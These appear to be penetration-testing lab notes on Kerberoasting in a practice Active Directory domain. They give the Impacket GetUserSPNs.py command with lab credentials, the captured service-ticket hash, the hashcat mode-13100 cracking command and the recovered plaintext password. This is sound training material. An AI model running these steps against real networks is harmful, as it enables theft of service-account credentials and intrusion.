## Kerberoasting

- Any valid user gets a ticket with kerberos to access a service (SQL for instance)
- Tool: GetUsersSPNS.py - Impacket
- Get a hash using the tool
  ```
  ┌──(root💀kali)-[~kali]
  └─# GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 10.0.2.5 -request
  /usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

  ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet      LastLogon 
  --------------------------------------  ----------  -----------------------------------------------------------  -------------------  ---------
  HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2022-01-28 17:55:04  <never>   

  $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb60bb[STRIPPED]7e35f1a787901409e16bc
  ```
- Finding the proper module in hashcat `hashcat --help | grep Kerberos`
  ```
  ┌──(root💀kali)-[~/active-directory]
  └─# hashcat --help | grep Kerberos
     7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
    13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
    18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
    19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
    19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
    19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
    19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
  ```
- We need TGS which is 13100
- Crack the hash with hachcat
  ```
  ┌──(root💀kali)-[~/active-directory]
  └─# hashcat -m 13100 hashkerb.txt /usr/share/wordlists/rockyou.txt -O 
  ```
- We get the password
  ```
  $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb6[STRIPPED]6bc:MYpassword123#
  ```